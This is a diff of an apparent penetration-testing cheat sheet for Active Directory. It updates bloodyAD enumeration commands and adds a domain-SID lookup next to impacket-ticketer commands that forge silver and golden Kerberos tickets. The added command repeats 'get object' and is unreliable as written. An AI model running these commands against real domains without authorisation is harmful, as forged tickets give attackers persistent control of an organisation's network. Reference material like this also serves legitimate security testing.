@@ -512,7 +512,7 @@ bloodyAD -H <Domain_Controller_IP> -u <AD_user> -p <AD_password or LM:NT]> get m
   <summary> BloodyAD Get writable </summary> 
 
 ```shell
-bloodyAD -H <Domain_Controller_IP> -u <AD_user> -p <AD_password or LM:NT]> get writable
+bloodyAD --dc-ip <Domain_Controller_IP> -u <AD_user> -p <AD_password or LM:NT]> get writable
 ```
 </details>
 
@@ -520,7 +520,7 @@ bloodyAD -H <Domain_Controller_IP> -u <AD_user> -p <AD_password or LM:NT]> get w
   <summary> BloodyAD Get object info </summary> 
 
 ```shell
-bloodyAD -H <Domain_Controller_IP> -u <AD_user> -p <AD_password or LM:NT]> get object <object>
+bloodyAD --dc-ip <Domain_Controller_IP> -u <AD_user> -p <AD_password or LM:NT]> get object <object>
 ```
 </details>
 
@@ -1225,6 +1225,12 @@ wmic useraccount where name="USER" get sid
 impacket-ticketer -nthash <nthash> -domain-sid <domain-sid> -domain <AD_domain> -dc-ip <Domain_Controller_IP> -spn <service>/<AD_domain> <user>
 ```
 #### Golden ticket
+
+##### Get domain SID
+```shell
+bloodyAD --dc-ip <Domain_Controller_IP> -u <AD_user> -p <AD_password or LM:NT]> get object get object "DC=<domain>,DC=<local>" --attr objectSid
+```
+
 ```shell
 impacket-ticketer -nthash <nthash> -domain-sid <domain-sid> -domain <AD_domain> -dc-ip <Domain_Controller_IP> <user>
 ```
